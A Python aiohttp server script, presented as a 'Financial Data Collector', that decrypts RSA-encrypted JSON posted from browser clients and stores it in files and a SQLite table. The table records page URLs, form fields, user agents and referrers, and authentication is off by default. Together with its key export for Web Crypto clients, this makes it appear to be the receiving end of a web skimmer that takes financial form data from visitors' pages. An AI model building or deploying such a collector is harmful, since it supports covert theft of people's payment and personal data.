#!/usr/bin/env python3
"""
Financial Data Collector Server
REST API endpoint that receives encrypted financial data
"""
import asyncio
import json
import logging
import os
import ssl
from datetime import datetime
from pathlib import Path

from aiohttp import web
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Configuration
CONFIG = {
    'HOST': os.getenv('SERVER_HOST', '0.0.0.0'),
    'PORT': int(os.getenv('SERVER_PORT', 443)),
    'PRIVATE_KEY_PATH': os.getenv('PRIVATE_KEY_PATH', './keys/private.pem'),
    'DATA_DIR': os.getenv('DATA_DIR', './collected_data'),
    'LOG_LEVEL': os.getenv('LOG_LEVEL', 'INFO'),
    'REQUIRE_AUTH': os.getenv('REQUIRE_AUTH', 'false').lower() == 'true',
    'AUTH_TOKEN': os.getenv('AUTH_TOKEN', ''),
    'SSL_CERT': os.getenv('SSL_CERT_PATH', './ssl/cert.pem'),
    'SSL_KEY': os.getenv('SSL_KEY_PATH', './ssl/key.pem'),
    'USE_SSL': os.getenv('USE_SSL', 'true').lower() == 'true'
}

# Setup logging
logging.basicConfig(
    level=getattr(logging, CONFIG['LOG_LEVEL']),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('./server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DataCollector:
    """Main application for receiving and storing financial data"""
    
    def __init__(self):
        self.private_key = None
        self.app = web.Application()
        self.setup_routes()
        self.ensure_directories()
        self.load_private_key()
    
    def ensure_directories(self):
        """Create necessary directories"""
        Path(CONFIG['DATA_DIR']).mkdir(parents=True, exist_ok=True)
        Path('./keys').mkdir(exist_ok=True)
        Path('./ssl').mkdir(exist_ok=True)
        Path('./logs').mkdir(exist_ok=True)
    
    def load_private_key(self):
        """Load RSA private key for decryption"""
        try:
            with open(CONFIG['PRIVATE_KEY_PATH'], 'rb') as f:
                key_data = f.read()
            
            self.private_key = serialization.load_pem_private_key(
                key_data,
                password=None,
                backend=default_backend()
            )
            logger.info("Private key loaded successfully")
        except Exception as e:
            logger.error(f"Failed to load private key: {e}")
            raise
    
    def setup_routes(self):
        """Setup API routes"""
        self.app.router.add_post('/api/collect', self.handle_collect)
        self.app.router.add_get('/health', self.handle_health)
    
    async def handle_health(self, request):
        """Health check endpoint"""
        return web.json_response({
            'status': 'online',
            'timestamp': datetime.utcnow().isoformat(),
            'service': 'financial_collector'
        })
    
    async def handle_collect(self, request):
        """
        Receive encrypted financial data from client
        """
        # Optional authentication
        if CONFIG['REQUIRE_AUTH']:
            auth_header = request.headers.get('Authorization', '')
            if not auth_header.startswith('Bearer ') or \
               auth_header[7:] != CONFIG['AUTH_TOKEN']:
                return web.json_response(
                    {'error': 'Unauthorized'},
                    status=401
                )
        
        try:
            data = await request.json()
            encrypted_b64 = data.get('encrypted')
            
            if not encrypted_b64:
                return web.json_response(
                    {'error': 'No encrypted data provided'},
                    status=400
                )
            
            # Decrypt the data
            decrypted = await self.decrypt_data(encrypted_b64)
            
            # Generate filename with timestamp and hash
            import hashlib
            timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S_%f')
            data_hash = hashlib.sha256(json.dumps(decrypted).encode()).hexdigest()[:16]
            filename = f"{timestamp}_{data_hash}.json"
            
            # Save to file
            filepath = Path(CONFIG['DATA_DIR']) / filename
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(decrypted, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Data saved: {filename}")
            
            # Also log to database if needed
            await self.log_to_database(decrypted)
            
            return web.json_response({
                'status': 'received',
                'filename': filename
            })
            
        except json.JSONDecodeError:
            return web.json_response(
                {'error': 'Invalid JSON'},
                status=400
            )
        except Exception as e:
            logger.error(f"Error processing request: {e}")
            return web.json_response(
                {'error': 'Internal server error'},
                status=500
            )
    
    async def decrypt_data(self, encrypted_b64):
        """
        Decrypt base64-encoded data using RSA private key
        """
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        import base64
        
        try:
            # Decode base64
            encrypted_bytes = base64.b64decode(encrypted_b64)
            
            # Decrypt
            decrypted_bytes = self.private_key.decrypt(
                encrypted_bytes,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Parse JSON
            return json.loads(decrypted_bytes.decode('utf-8'))
            
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            raise
    
    async def log_to_database(self, data):
        """
        Optional: Log to SQLite database for easier querying
        """
        try:
            import sqlite3
            from contextlib import closing
            
            db_path = Path(CONFIG['DATA_DIR']) / 'data.db'
            
            with closing(sqlite3.connect(db_path)) as conn:
                conn.execute('''
                    CREATE TABLE IF NOT EXISTS financial_data (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp TEXT NOT NULL,
                        url TEXT NOT NULL,
                        data_type TEXT NOT NULL,
                        fields_json TEXT NOT NULL,
                        user_agent TEXT,
                        referrer TEXT,
                        ip_address TEXT,
                        created_at TEXT DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO financial_data 
                    (timestamp, url, data_type, fields_json, user_agent, referrer)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    data.get('timestamp'),
                    data.get('url'),
                    data.get('data', {}).get('type', 'unknown'),
                    json.dumps(data.get('data', {})),
                    data.get('userAgent'),
                    data.get('referrer')
                ))
                
                conn.commit()
                
        except Exception as e:
            logger.warning(f"Database logging failed: {e}")
    
    def run(self):
        """Start the server"""
        if CONFIG['USE_SSL']:
            # SSL context for HTTPS
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(
                CONFIG['SSL_CERT'],
                CONFIG['SSL_KEY']
            )
            
            web.run_app(
                self.app,
                host=CONFIG['HOST'],
                port=CONFIG['PORT'],
                ssl_context=ssl_context
            )
        else:
            web.run_app(
                self.app,
                host=CONFIG['HOST'],
                port=CONFIG['PORT']
            )

def generate_keys():
    """Generate RSA key pair for encryption"""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    
    # Generate private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # Get public key
    public_key = private_key.public_key()
    
    # Save private key
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    with open(CONFIG['PRIVATE_KEY_PATH'], 'wb') as f:
        f.write(private_pem)
    
    # Save public key in SPKI format (for Web Crypto API)
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    public_key_path = CONFIG['PRIVATE_KEY_PATH'].replace('private', 'public')
    with open(public_key_path, 'wb') as f:
        f.write(public_pem)
    
    # Also output public key as single line for JavaScript
    public_b64 = base64.b64encode(public_pem).decode('utf-8')
    public_js_path = './keys/public_key.txt'
    with open(public_js_path, 'w') as f:
        f.write(public_b64)
    
    logger.info(f"Keys generated:\nPrivate: {CONFIG['PRIVATE_KEY_PATH']}\nPublic: {public_key_path}")
    logger.info(f"Public key (base64) saved to: {public_js_path}")
    
    return public_b64

if __name__ == '__main__':
    import base64
    
    # Check if keys exist, generate if not
    if not Path(CONFIG['PRIVATE_KEY_PATH']).exists():
        logger.info("Generating new RSA key pair...")
        public_key_b64 = generate_keys()
        logger.info(f"Public key for client:\n{public_key_b64}")
    
    # Start server
    collector = DataCollector()
    logger.info(f"Starting server on {CONFIG['HOST']}:{CONFIG['PORT']}")
    collector.run()